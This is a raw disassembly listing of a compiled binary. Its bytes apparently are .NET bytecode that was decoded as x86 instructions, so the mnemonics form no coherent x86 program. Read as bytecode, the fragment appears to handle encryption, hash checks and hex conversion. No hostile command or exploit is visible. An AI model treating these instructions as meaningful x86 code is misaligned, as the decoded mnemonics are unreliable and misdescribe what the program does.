  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 52             	add    %dh,0x52(%edx)
  4042d8:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 80             	add    %dh,-0x80(%edx)
  40436b:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	d6                   	salc
  404507:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 dc    	or     %dl,-0x238df9f3(%ecx)
  4045a2:	26 00 70 09          	add    %dh,%es:0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 ec    	or     %dl,-0x138df9f3(%ecx)
  4045ea:	26 00 70 09          	add    %dh,%es:0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
  4046e7:	58                   	pop    %eax
